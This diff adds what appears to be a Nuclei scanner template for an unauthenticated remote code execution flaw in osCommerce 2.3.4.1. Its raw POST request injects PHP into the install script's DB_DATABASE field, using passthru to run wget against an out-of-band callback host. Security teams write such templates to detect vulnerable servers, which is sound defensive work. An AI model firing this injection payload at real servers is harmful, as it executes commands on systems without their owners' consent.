@@ -1,0 +1,43 @@
+id: oscommerce-rce
+
+info:
+  name: osCommerce 2.3.4.1 - Unauthenticated Remote Code Execution
+  author: gy741
+  severity: critical
+  description: Exploiting the install.php finish process by injecting php payload into the db_database parameter & read the system command output from configure.php. The RCE doesn't need to be authenticated.
+  reference: |
+    - https://www.exploit-db.com/exploits/50128
+  tags: oscommerce,rce,oob
+
+requests:
+  - raw:
+      - |
+        POST /install/install.php?step=4 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.18.4
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        Content-Length: 103
+        Content-Type: application/x-www-form-urlencoded
+
+        DIR_FS_DOCUMENT_ROOT=.%2F&DB_DATABASE=%27%29%3Bpassthru%28%27wget+http%3A%2F%2F{{interactsh-url}}%27%29%3B%2F%2A
+
+      - |
+        GET /install/includes/configure.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.18.4
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - "http"
+
+      - type: status
+        status:
+          - 200
